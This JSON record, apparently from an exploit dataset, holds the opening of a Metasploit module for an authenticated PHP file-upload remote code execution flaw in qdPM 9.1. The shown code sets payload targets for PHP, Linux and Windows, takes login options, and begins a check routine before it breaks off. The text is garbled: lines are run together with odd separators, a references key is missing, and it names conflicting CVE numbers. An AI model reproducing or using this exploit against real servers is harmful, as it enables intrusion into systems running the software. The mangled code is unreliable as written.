{
    "text": "vul_name : qdPM 9.1 Authenticated Shell Upload ， vul_cve : CVE-2015-3884 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， include Msf : Exploit : PhpEXE ， include Msf : Exploit : FileDropper ， super (  ， update_info (  ， info ,  ， 'Name' => 'qdPM 9.1 Authenticated Arbitrary PHP File Upload ( RCE ) ' ,  ， 'Description' => %q{ ， A remote code execution ( RCE ) vulnerability exists in qdPM 9.1 and earlier. ， An attacker can upload a malicious PHP code file via the profile photo functionality , by leveraging a path traversal ， vulnerability in the users [ 'photop_preview' ] delete photo feature , allowing bypass of .htaccess protection. ， NOTE : this issue exists because of an incomplete fix for CVE-2015-3884. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Rishal Dwivedi ( Loginsoft ) ' ,  # Discovery ， 'Leon Trappett ( thepcn3rd ) ' ,  # PoC ， 'Giacomo Casoni' # Metasploit ，  ]  ,  ， ' ，  [ 'CVE' , '2020-7246' ]  ,  ，  [ 'EDB' , '50175' ]  ，  ]  ,  ， 'Payload' => { ， 'BadChars' => \"\\x00\" ， } ,  ， 'DefaultOptions' => { ， 'EXITFUNC' => 'thread' ， } ,  ， 'Platform' => %w [ linux php ]  ,  ， 'Targets' => [  ，  [ 'Generic ( PHP Payload ) ' , { 'Arch' => ARCH_PHP , 'Platform' => 'php' } ]  ,  ，  [ 'Linux x86' , { 'Arch' => ARCH_X86 , 'Platform' => 'linux' } ]  ,  ，  [ 'Linux x64' , { 'Arch' => ARCH_X64 , 'Platform' => 'linux' } ]  ,  ，  [ 'Windows x86' , { 'Arch' => ARCH_X86 , 'Platform' => 'win' } ]  ,  ，  [ 'Windows x64' , { 'Arch' => ARCH_X64 , 'Platform' => 'win' } ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'DisclosureDate' => '2020-11-21' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ 'CRASH_SAFE' ]  ,  ， 'Reliability' => [ 'IOC_IN_LOGS' ]  ,  ， 'SideEffects' => [ 'REPEATABLE_SESSION' ]  ， } ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base directory where qdPM resides' , '/' ]  )  ,  ， OptString.new ( 'EMAIL' ,  [ true , 'The email to login with' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'The password to login with' ]  )  ，  ]  ， self.needs_cleanup = true ， end ， def check ， uri = normalize_uri ( uri , '/index.php' )  ， res = send_request_raw ( { 'uri' => uri } ) ",
    "time": "2022.09.29"
}